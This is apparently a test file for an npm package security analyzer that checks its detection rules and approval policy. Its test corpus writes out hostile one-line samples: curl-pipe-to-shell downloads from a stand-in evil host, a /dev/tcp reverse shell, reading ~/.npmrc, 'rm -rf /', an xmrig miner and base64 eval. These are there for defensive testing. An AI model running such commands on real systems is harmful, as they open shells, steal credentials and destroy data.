import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";
import { analyzePackage } from "../src/security/analyzer.js";
import { decidePackagePolicy } from "../src/security/policy.js";

const root = await mkdtemp(join(tmpdir(), "bnpm-analyzer-"));
after(async () => rm(root, { recursive: true, force: true }));

test("analysis explains dangerous behavior and approvals bind every script input", async () => {
  await mkdir(root, { recursive: true });
  await writeFile(join(root, "install.js"), "require('child_process').exec('curl https://evil.invalid/p | sh')\n");
  const analyzed = await analyzePackage({ root, packageName: "danger", packageVersion: "1.0.0", integrity: "sha512-exact", scripts: { postinstall: "node install.js" } });
  assert.ok(analyzed.analysis.findings.some((finding) => finding.ruleId === "BNPM-SEC-002" && finding.severity === "dangerous"));
  assert.deepEqual(analyzed.lifecycles[0]?.referencedFiles, ["install.js"]);
  assert.equal(decidePackagePolicy({ analyzed, allowedDangerous: new Set() }).blocked, true);
  const lifecycle = analyzed.lifecycles[0];
  assert.ok(lifecycle);
  const approved = decidePackagePolicy({
    analyzed,
    allowedDangerous: new Set(["danger@1.0.0"]),
    trustedApproval: { version: "1.0.0", integrity: "sha512-exact", scripts: { postinstall: { commandHash: lifecycle.commandHash, contentHash: lifecycle.contentHash } } },
  });
  assert.equal(approved.blocked, false);
  assert.equal(approved.approvedLifecycles.length, 1);
  const changed = decidePackagePolicy({
    analyzed,
    allowedDangerous: new Set(["danger@1.0.0"]),
    trustedApproval: { version: "1.0.0", integrity: "sha512-changed", scripts: { postinstall: { commandHash: lifecycle.commandHash, contentHash: lifecycle.contentHash } } },
  });
  assert.equal(changed.approvedLifecycles.length, 0);
});

test("security corpus produces every stable high-confidence rule identifier", async () => {
  const corpus = join(root, "corpus");
  await mkdir(corpus, { recursive: true });
  await writeFile(join(corpus, "reverse.sh"), "bash -i >& /dev/tcp/evil.invalid/4444 0>&1\n");
  await writeFile(join(corpus, "payload.sh"), "curl https://evil.invalid/payload | sh\n");
  await writeFile(join(corpus, "credentials.js"), "readFileSync(process.env.HOME + '/.npmrc')\n");
  await writeFile(join(corpus, "persist.sh"), "crontab ./job\n");
  await writeFile(join(corpus, "destroy.sh"), "rm -rf /\n");
  await writeFile(join(corpus, "miner.js"), "spawn('xmrig', ['stratum+tcp://pool.invalid'])\n");
  await writeFile(join(corpus, "obfuscated.js"), "eval(Buffer.from(value, 'base64').toString())\n");
  const analyzed = await analyzePackage({ root: corpus, packageName: "corpus", packageVersion: "1.0.0", integrity: "sha512-corpus" });
  assert.deepEqual(new Set(analyzed.analysis.findings.map((finding) => finding.ruleId)), new Set([
    "BNPM-SEC-001", "BNPM-SEC-002", "BNPM-SEC-003", "BNPM-SEC-004", "BNPM-SEC-005", "BNPM-SEC-006", "BNPM-SEC-007",
  ]));
  for (const finding of analyzed.analysis.findings) {
    assert.ok(finding.evidence.length <= 160);
    assert.ok(finding.location?.line && finding.location.column);
  }
});

test("execution capability analysis detects native code and sensitive runtime access", async () => {
  const packageRoot = join(root, "capabilities"); await mkdir(packageRoot, { recursive: true });
  await writeFile(join(packageRoot, "tool"), Buffer.concat([Buffer.from([0xcf, 0xfa, 0xed, 0xfe]), Buffer.from("\0.codex/sessions\0credentials.json\0https://api.example.invalid/v1\0writeFileSync\0child_process\0")]));
  const analyzed = await analyzePackage({ root: packageRoot, packageName: "capability-tool", packageVersion: "1.0.0", integrity: "sha512-capabilities" }); const kinds = new Set(analyzed.capabilities?.map((capability) => capability.kind));
  assert.deepEqual(kinds, new Set(["ai-history-read", "credential-read", "network-access", "local-write", "process-spawn", "native-code"]));
  assert.ok(analyzed.capabilities?.every((capability) => capability.evidence.length > 0));
});

test("large packages are inspected within a byte budget instead of aborting installation", async () => {
  const packageRoot = join(root, "large-package"); await mkdir(packageRoot, { recursive: true });
  await writeFile(join(packageRoot, "large.bin"), Buffer.concat([Buffer.from([0xcf, 0xfa, 0xed, 0xfe]), Buffer.alloc(4096)]));
  const analyzed = await analyzePackage({ root: packageRoot, packageName: "large-package", packageVersion: "1.0.0", integrity: "sha512-large", maxBytes: 1024 });
  assert.equal(analyzed.analysis.findings.some((finding) => finding.ruleId === "BNPM-SEC-009"), true);
  assert.equal(analyzed.capabilities?.some((capability) => capability.kind === "native-code"), true);
});

test("documentation and printed install instructions do not masquerade as executed payloads", async () => {
  const packageRoot = join(root, "passive-evidence"); await mkdir(packageRoot, { recursive: true });
  await writeFile(join(packageRoot, "README.md"), "Install with `curl https://example.invalid/tool | sh`\n");
  await writeFile(join(packageRoot, "message.js"), "const help = `echo install with curl https://example.invalid/tool | sh`\n");
  await writeFile(join(packageRoot, "active.sh"), "curl https://evil.invalid/payload | sh\n");
  const analyzed = await analyzePackage({ root: packageRoot, packageName: "passive-evidence", packageVersion: "1.0.0", integrity: "sha512-passive" });
  const payloadFindings = analyzed.analysis.findings.filter((finding) => finding.ruleId === "BNPM-SEC-002");
  assert.equal(payloadFindings.length, 1); assert.equal(payloadFindings[0]?.location?.path, "active.sh");
});

test("generic credential APIs are not reported as secret-file access", async () => {
  const packageRoot = join(root, "credential-api"); await mkdir(packageRoot, { recursive: true });
  await writeFile(join(packageRoot, "provider.js"), "export class CredentialProvider { getCredentials() {} }\n");
  const analyzed = await analyzePackage({ root: packageRoot, packageName: "credential-api", packageVersion: "1.0.0", integrity: "sha512-credential-api" });
  assert.equal(analyzed.analysis.findings.some((finding) => finding.ruleId === "BNPM-SEC-003"), false);
});
